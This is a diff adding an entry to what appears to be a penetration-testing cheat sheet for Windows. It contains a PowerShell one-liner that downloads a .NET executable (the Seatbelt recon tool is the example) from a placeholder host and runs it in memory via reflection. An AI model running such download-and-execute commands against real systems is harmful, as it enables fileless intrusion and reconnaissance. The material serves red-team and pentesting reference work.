@@ -2,6 +2,20 @@
 
 #plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 
 
+
+## assembly reflection (1)
+#cat/UTILS
+
+asm.EntryPoint 
+
+```powershell
+$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<asm_ref_bin_path><asm_ref_exe_name>.exe'); $asm = [System.Reflection.Assembly]::Load($data); $OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,([String[]] @(<asm_ref_params>)))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
+```
+= asm_ref_bin_path: windows/NetFramework_4.7_x64/
+= asm_ref_exe_name: Seatbelt
+= asm_ref_exe_cmd: "klist"
+= asm_ref_params: "-group=all", "-full"
+
 ## unzip file
 #plateform/windows #target/local #cat/UTILS #tag/powershell 
 ```powershell
